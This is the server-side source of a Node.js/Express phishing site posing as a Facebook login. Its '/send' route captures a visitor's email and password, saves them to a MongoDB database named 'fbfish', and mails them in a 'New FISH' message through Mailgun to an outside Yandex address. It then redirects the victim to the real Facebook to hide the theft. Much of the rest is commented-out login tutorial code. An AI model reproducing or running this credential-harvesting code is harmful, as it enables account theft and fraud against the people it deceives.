var express               = require("express");
var mongoose              = require("mongoose");
var passport              = require("passport");
var bodyParser            = require("body-parser");
var detailsModel                   = require("./models/details");
var LocalStrategy         = require("passport-local");
var passportLocalMongoose = require("passport-local-mongoose");
var nodemailer = require ('nodemailer');
const path = require('path');
var smtpTransport = require('nodemailer-smtp-transport');


// mongoose.connect("mongodb://localhost/auth_demo_aapp", {useNewUrlParser: true}); 
var app = express();
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json());
 var url ="mongodb://localhost/fbfish" ; 
 mongoose.connect(url, {useNewUrlParser: true});

// app.use(require("express-session")({
//     secret: "Rusty is the best and cutest dog in the wolrd", //kind of secret key to De-code the session
//     resave: false,
//     saveUninitialized: false
//     }));
    
    app.use('/public', express.static(path.join(__dirname, 'public')));
// app.use(passport.initialize());
// app.use(passport.session());

// passport.use(new LocalStrategy(User.authenticate()));
// passport.serializeUser(User.serializeUser()); //encodes the session
// passport.deserializeUser(User.deserializeUser()); //Un/de encode the session

//====================================
// ROUTES
//====================================

app.get("/", function(req,res){
    res.render("index.ejs");
});

app.post("/send", function(req,res){
   var output = `
   <p> You have a new fish</p>
   <h3> New FISH ! </h3>
   <ul>
  <li>Email: ${req.body.email}</li>
      <li>Password: ${req.body.password}</li>
         
    
   </ul>
   `;
//  var email = req.body.email ; 
//  var newDetails = { email: email };
//   Details.create(newDetails);
//  console.log(newDetails);
var detailsData = new detailsModel();
        detailsData.email = req.body.email; 
          detailsData.password = req.body.password; 
        detailsData.save(function (err, savedJob) {
      if (err) {
        return console.log(err);
      } else {
         return console.log("email " + savedJob);
      }
});

//   console.log("your req params are: "  + req.body.email + "and the pw is " + req.body.password)
//   function hel({
//       var details = new Details ({
//       email: req.body.email
//   });
//   details.save();
  // create reusable transporter object using the default SMTP transport
var transporter = nodemailer.createTransport(smtpTransport({
    host: 'smtp.mailgun.org',
    port: 465,
    secure: true,
    auth: {
    user: 'postmaster@sandboxe1fd9f767b4e4231bd7e7eee3b3e734b.mailgun.org',
    pass: 'process.env.EMAILPASSWORD'
   //to view password run console.log process.env.EMAILPASSWORD than run the server.
  }
  
}));
  // send mail with defined transport object
  let mailOptions = {
    from: '"Nodemailer contact" <postmaster@sandboxe1fd9f767b4e4231bd7e7eee3b3e734b.mailgun.org>', // sender address
    to: "switchmailer@yandex.com", // list of receivers
    subject: "Hello ✔", // Subject line
    text: "Hello world?", // plain text body
    html: output // html body
  };
transporter.sendMail(mailOptions);
console.log (console.error);
// After 5 sec will redirect to the real FB...
   setTimeout(function(){
            res.status(301).redirect("https://www.facebook.com")
         }, 5000);
//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

//   // Preview only available when sending through an Ethereal account
//   console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
//   // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...


});


// app.get("/secret",isLoggedIn, function(req,res){  //pls review isLoggedIn in the bottom
//     res.render("secret");
// });

// // Auth Routes

// //show signup form
// app.get("/register", function(req, res){
//     res.render("register");
// });

// //handling user signup
// app.post("/register", function(req, res){

//     User.register(new User({username: req.body.username}), req.body.password, function(err, user){
//         if(err){
//             console.log(err);
//             return res.render("register");
//         }  else {
//             passport.authenticate("local")(req, res, function(){
//                 res.redirect("/secret");
//             });
//             }
//     });
// });


// LOGIN ROUTES

//render login form
// app.get("/login", function(req, res){
//     res.render("login");
// });

// // login logic
// //middleware
// app.post("/login",passport.authenticate("local", {
//     successRedirect: "/secret",
//     failureRedirect: "/login"
// }), function(req, res){
// });

// //logout
// app.get("/logout", function(req, res){
//     req.logout();
//     res.redirect("/");
// });

// //the following route will check if the user is logged in, if not he won't show the secret page. //middleware
// function isLoggedIn(req, res, next){  //"next" is the next thing the app will do after the response.aka KEEPGOING
//   if(req.isAuthenticated()){   // aka if the user is logged in
//       return next();
//     }
//     res.redirect("/login");   //in case he failed to login.
// }


app.listen(process.env.PORT, process.env.IP, function(){
  console.log("The  Server Has Started!"); 
});